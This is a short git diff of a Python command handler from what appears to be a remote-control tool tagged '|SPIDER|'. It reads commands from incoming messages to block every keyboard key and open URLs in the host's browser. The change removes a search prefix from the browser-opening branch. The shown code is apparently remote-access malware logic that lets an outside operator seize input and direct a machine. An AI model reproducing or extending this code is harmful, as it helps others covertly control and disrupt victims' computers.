@@ -375,7 +375,7 @@ def echo_all(message):
                     keyboard.block_key(i)
                 end = "|SPIDER| - BLOCK ALL KEYS"
             elif "browser" in b:
-                webbrowser.open_new_tab(search_sys+b.split('browser')[1][1:])
+                webbrowser.open_new_tab(b.split('browser')[1][1:])
                 end = "|SPIDER| - OPEN REQUEST IN BROWSER\nURL:"+search_sys+b.split('browser')[1][1:].replace(" ","%20")+"\nREQUEST:"+ b.split('browser')[1][1:]
             elif "search_sys"in b:
                 search_sys=b.split('search_sys')[1][1:]
